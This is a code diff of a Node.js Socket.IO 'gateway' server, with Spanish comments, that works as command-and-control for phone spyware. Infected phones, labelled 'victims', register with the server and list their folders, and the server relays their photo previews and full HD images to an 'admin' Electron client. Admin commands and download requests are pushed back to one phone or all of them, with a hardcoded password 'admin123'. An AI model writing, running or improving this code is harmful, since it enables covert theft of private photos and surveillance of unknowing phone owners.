@@ -1,117 +1,115 @@
 const express = require('express');
 const http = require('http');
 const { Server } = require("socket.io");
-const cors = require('cors');
 
 const app = express();
-app.use(cors());
-
-const PORT = process.env.PORT || 3000;
-const AUTH_PASS = "admin123"; // La misma contraseña que usabas
-
-// Endpoint simple para verificar que el server vive
-app.get('/', (req, res) => {
-    res.send("MyNotes Gateway Online. Waiting for Electron Client...");
-});
-
 const server = http.createServer(app);
-const io = new Server(server, { 
-    cors: { origin: "*" }, 
-    allowEIO3: true,
-    maxHttpBufferSize: 1e8 
+
+// AQUÍ AGREGAMOS LA LÍNEA MÁGICA
+const io = new Server(server, {
+    cors: { 
+        origin: "*", 
+        methods: ["GET", "POST"] 
+    },
+    maxHttpBufferSize: 1e8, // 100 MB para subir fotos HD
+    allowEIO3: true         // <--- CRÍTICO PARA COMPATIBILIDAD CON ANDROID
 });
 
-let victims = {}; // Lista de celulares
-let adminSocket = null; // Tu PC con Electron
+// ALMACENAMIENTO INTELIGENTE
+let admins = new Set();
+let victims = {}; 
+let deviceMap = {}; 
 
 io.on('connection', (socket) => {
     
-    // 1. IDENTIFICACIÓN (¿Eres el Admin o un Celular?)
-    const authType = socket.handshake.auth.type;
-    const authPass = socket.handshake.auth.token;
+    // 1. IDENTIFICACIÓN
+    const type = socket.handshake.auth.type;
+    const token = socket.handshake.auth.token;
 
-    if (authType === 'admin') {
-        if (authPass === AUTH_PASS) {
-            console.log(`[!] ADMIN CONECTADO (Electron): ${socket.id}`);
-            adminSocket = socket;
-            // Al conectar el admin, le enviamos la lista actual de víctimas
-            socket.emit('update_device_list', victims);
-        } else {
-            console.log(`[!] Intento de admin fallido`);
-            socket.disconnect();
-            return;
-        }
-    } else {
-        // Es un celular (o se asume)
-        // No hacemos nada hasta que mande 'register_device'
-    }
+    if (type === 'admin' && token === 'admin123') {
+        console.log('[ADMIN] Conectado:', socket.id);
+        admins.add(socket.id);
+        socket.emit('update_device_list', victims);
+    } 
 
-    // 2. RUTEO DE DATOS (CELULAR -> ADMIN)
+    // 2. REGISTRO DE VÍCTIMA (CELULAR)
     socket.on('usrData', (data) => {
-        // A. Registro del dispositivo
-        if (data.dataType === 'register_device') {
+        if (data.deviceId) {
+            const uniqueId = data.deviceId;
+
+            // DETECCIÓN DE DUPLICADOS (LÓGICA LIMPIA)
+            if (deviceMap[uniqueId] && deviceMap[uniqueId] !== socket.id) {
+                const oldSocketId = deviceMap[uniqueId];
+                delete victims[oldSocketId];
+                // Intentamos desconectar el socket viejo para que no gaste recursos
+                const oldSocket = io.sockets.sockets.get(oldSocketId);
+                if(oldSocket) oldSocket.disconnect(true);
+            }
+
+            deviceMap[uniqueId] = socket.id;
+            
             victims[socket.id] = {
-                name: data.deviceName,
-                id: data.deviceId,
-                socketId: socket.id
+                name: data.deviceName || "Unknown",
+                id: uniqueId,
+                socketId: socket.id,
+                folders: data.folders || []
             };
-            console.log(`[+] Celular: ${data.deviceName}`);
-            // Avisar al Admin si está conectado
-            if (adminSocket) adminSocket.emit('update_device_list', victims);
+
+            broadcastVictims();
         }
-        
-        // B. Actualización de carpetas
+
+        // REENVÍO DE DATOS
+        if (data.dataType === 'preview_image') {
+            io.to(Array.from(admins)).emit('new_preview', { ...data, victimId: socket.id });
+        } 
+        else if (data.dataType === 'full_image') {
+            io.to(Array.from(admins)).emit('receive_full', { ...data, victimId: socket.id });
+        }
         else if (data.dataType === 'folder_list') {
             if (victims[socket.id]) {
                 victims[socket.id].folders = data.folders;
-                if (adminSocket) adminSocket.emit('update_device_list', victims);
-            }
-        }
-
-        // C. Previews e Imágenes HD (Reenviar al Admin)
-        else if (data.dataType === 'preview_image' || data.dataType === 'full_image') {
-            data.victimId = socket.id; // Asegurar que el admin sepa de quién es
-            if (adminSocket) {
-                // REENVIAR AL ELECTRON
-                adminSocket.emit(data.dataType === 'preview_image' ? 'new_preview' : 'receive_full', data);
+                broadcastVictims();
             }
         }
     });
 
-    // 3. COMANDOS (ADMIN -> CELULAR)
+    // 3. COMANDOS DEL ADMIN
     socket.on('admin_command', (cmd) => {
-        // Solo aceptamos comandos si vienen del socket guardado como admin
-        if (socket !== adminSocket) return;
+        if (!admins.has(socket.id)) return; 
 
-        console.log(`[CMD] ${cmd.action} -> ${cmd.target}`);
-        
         if (cmd.target === 'ALL') {
-            socket.broadcast.emit('command_' + cmd.action, { folder: cmd.folder });
+            socket.broadcast.emit('command_' + cmd.action, cmd);
         } else {
-            io.to(cmd.target).emit('command_' + cmd.action, { folder: cmd.folder });
+            io.to(cmd.target).emit('command_' + cmd.action, cmd);
         }
     });
-
-    // 4. SOLICITUD DE DESCARGA (ADMIN -> CELULAR)
+    
     socket.on('order_download', (data) => {
-        if (socket !== adminSocket) return;
-        if(data.target) {
-            io.to(data.target).emit('request_full_image', { path: data.path });
-        }
+        io.to(data.target).emit('request_full_image', data);
     });
 
-    // 5. DESCONEXIÓN
+    // 4. DESCONEXIÓN
     socket.on('disconnect', () => {
-        if (socket === adminSocket) {
-            console.log("[!] Admin desconectado");
-            adminSocket = null;
-        } else if (victims[socket.id]) {
-            console.log(`[-] Salió: ${victims[socket.id].name}`);
-            delete victims[socket.id];
-            if (adminSocket) adminSocket.emit('update_device_list', victims);
+        if (admins.has(socket.id)) {
+            admins.delete(socket.id);
+            console.log('[ADMIN] Desconectado');
+        } else {
+            if (victims[socket.id]) {
+                const devId = victims[socket.id].id;
+                delete deviceMap[devId];
+                delete victims[socket.id];
+                broadcastVictims();
+                console.log('[VICTIM] Desconectado:', socket.id);
+            }
         }
     });
 });
 
-server.listen(PORT, () => console.log(`🚀 GATEWAY RUNNING ON PORT ${PORT}`));
+function broadcastVictims() {
+    io.to(Array.from(admins)).emit('update_device_list', victims);
+}
 
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log(`GATEWAY V2.1 (EIO3 ENABLED) RUNNING ON PORT ${PORT}`);
+});
